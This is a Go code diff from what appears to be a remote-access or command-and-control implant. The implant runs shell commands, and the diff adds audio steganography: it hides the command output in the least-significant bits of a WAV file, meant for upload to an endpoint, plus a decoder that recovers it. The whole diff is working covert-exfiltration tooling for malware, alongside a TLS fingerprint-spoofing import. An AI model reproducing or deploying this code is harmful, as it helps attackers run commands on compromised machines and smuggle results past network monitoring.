@@ -14,6 +14,7 @@ import (
 	"strconv"
 	"os/exec"
 	"runtime"
+	"os"
 	utls "github.com/refraction-networking/utls"
 )
 
@@ -228,6 +229,7 @@ func executeCommand(finalCommand string){
 			shellBinary = "powershell"
 			shellFlag = "/C"
 		}
+
 		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
 		res, err := cmd.Output()
 		if err != nil {
@@ -239,10 +241,163 @@ func executeCommand(finalCommand string){
 		if len(formatted_out)<5{
 			if echo_to_stdout=="on"{
 			fmt.Println("sending output through strobble")}
+
 		}else{
 			if echo_to_stdout=="on"{
 			fmt.Println("Sending output through upload")}
+			go encoding_engine(formatted_out)
 		}
-		fmt.Println(formatted_out) 
+		//fmt.Println("output length - ", len(formatted_out)) 
 	}
+}
+
+func encoding_engine(output string){
+	output = "STRT"+output+"STOP"
+	//fmt.Println("the output ", output)
+	//need logic to store base track either on first loop, or /download endpoint
+	var	baseAudioTrack []byte
+	var newAudioTrack []byte
+	baseAudioTrack, err := os.ReadFile("sample.wav")
+	if err != nil {
+		log.Fatalf("Fatal: 'sample.wav' must exist in the root folder to execute this server: %v", err)
+	}
+
+	var op_bitstring []string
+	ChunkSize := 576
+	op_len_threshold := ChunkSize/8
+	byteOffset := 0
+	totalTrackBytes := len(baseAudioTrack)
+	chunk := make([]byte, ChunkSize)
+	numChunksEncoded :=0
+	bitstringCmdCharIndex :=0
+	pendingOutput :=""
+
+	//prepare bitstring for each char of output
+	for _, char := range output{
+		if echo_to_stdout=="on"{
+			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+		}
+		op_bitstring = append(op_bitstring, fmt.Sprintf("%08b", char))
+		//fmt.Println("Febug 5 - output bitstring state - ", op_bitstring)
+	}
+
+	for { //loop over baseAudioTrack, 1 ChunkSize at a time
+		//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
+		
+		// Boundary Check: If we reach the end of the file, reset pointer and increment loop
+		if byteOffset+ChunkSize > totalTrackBytes{
+			byteOffset = 0
+		}
+		if (len(pendingOutput)==0 && len(output)==0){
+			break
+		}
+
+		copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
+
+		//*********--encode message in the current chunk--******************//
+		//---code for byte to bit conversion
+		if len(pendingOutput)>0{
+			output = pendingOutput[:min(len(pendingOutput), op_len_threshold)]+output
+			pendingOutput = pendingOutput[min(len(pendingOutput), op_len_threshold):]
+		}
+		if len(output)>op_len_threshold{
+			pendingOutput += output[op_len_threshold:]
+			output = output[:op_len_threshold]
+		}
+
+		//----code to inject LSB from op_bitstring array into audio stream.
+		op_bitIndex :=0
+		op_charIndex :=0
+		var audio_stegd_bytes []byte
+
+		if echo_to_stdout=="on"{
+			fmt.Println("Chunk length = ", len(chunk))
+			fmt.Printf("Injecting payload (%d characters)...\n", len(output))
+		}
+
+		for _, aud_byte := range chunk{
+			if op_charIndex == len(output) {
+				if echo_to_stdout=="on"{
+					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+				}
+				break
+			}
+
+			ival, _ := strconv.Atoi(string(op_bitstring[bitstringCmdCharIndex][op_bitIndex]))
+			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
+			aud_byte = aud_byte | byte(ival)
+
+			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)
+
+			op_bitIndex++
+			if op_bitIndex==8{
+				op_charIndex ++
+				bitstringCmdCharIndex ++
+				op_bitIndex =0
+			}
+
+		}
+		copy(chunk[:op_charIndex*8], audio_stegd_bytes[:op_charIndex*8])
+		numChunksEncoded++
+		
+		newAudioTrack = append(newAudioTrack, chunk...)
+
+		//fmt.Println("chunk len verification - ", len(chunk))
+		byteOffset = byteOffset + ChunkSize
+		output = ""
+	}
+
+	if numChunksEncoded*ChunkSize > len(baseAudioTrack){
+		//need logic to shove shiz into another upload track. better choose a big one
+		fmt.Println("track too small for encoding the whole output")
+
+	}else{
+		newAudioTrack = append(newAudioTrack, baseAudioTrack[numChunksEncoded*ChunkSize:]...)
+	}
+	//send to /upload endpoint
+	decodeEngine(newAudioTrack, numChunksEncoded*ChunkSize)
+}
+
+func decodeEngine (newAudioTrack []byte, size int){
+	//--decode--------SERVER code-----
+
+	var fifo4 []byte
+	var current_decoded_byte byte
+	var decoded_op_byte []byte
+	op_bitIndex := 0
+	store_output :=0
+
+	for _, stegd_byte := range(newAudioTrack[:len(newAudioTrack)]){		
+		
+		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
+		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
+		//fmt.Println("stegd_byte = ", stegd_byte, " bitstring = ", last_bit_str, " last bit = ", last_bit_int)
+
+		//fmt.Println(last_bit_int)
+		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)
+
+		op_bitIndex++
+		if op_bitIndex==8{
+			if store_output==1{
+				decoded_op_byte = append(decoded_op_byte, current_decoded_byte)
+			}
+			fifo4 = append(fifo4, current_decoded_byte)
+			if len(fifo4) > 4{
+				fifo4 = fifo4[1:]
+			}
+			if "STRT"==string(fifo4){
+				store_output = 1
+			}
+			if "STOP"==string(fifo4){
+				store_output = 0
+				finalOutput := strings.Replace(string(decoded_op_byte), "STOP", "", -1)
+				decoded_op_byte = decoded_op_byte[:0]
+				fmt.Println(finalOutput)
+			}
+			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
+			op_bitIndex =0
+			current_decoded_byte = 0
+		}
+	}
+
 }
